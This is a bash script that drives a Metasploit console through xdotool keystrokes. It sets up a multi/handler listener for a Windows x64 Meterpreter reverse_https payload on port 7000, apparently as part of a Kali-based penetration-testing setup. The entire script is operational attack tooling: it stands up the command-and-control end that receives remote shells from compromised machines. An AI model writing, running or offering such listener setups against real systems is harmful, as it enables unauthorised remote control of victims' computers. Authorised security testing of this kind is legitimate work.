#!/bin/bash

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh

paste_command "use multi/handler"
xdotool key Return
sleep 1

paste_command "set payload windows/x64/meterpreter/reverse_https"
xdotool key Return
sleep 1

paste_command "set LHOST 0.0.0.0"
xdotool key Return
sleep 1

paste_command "set LPORT 7000"
xdotool key Return
sleep 1

paste_command "run"
xdotool key Return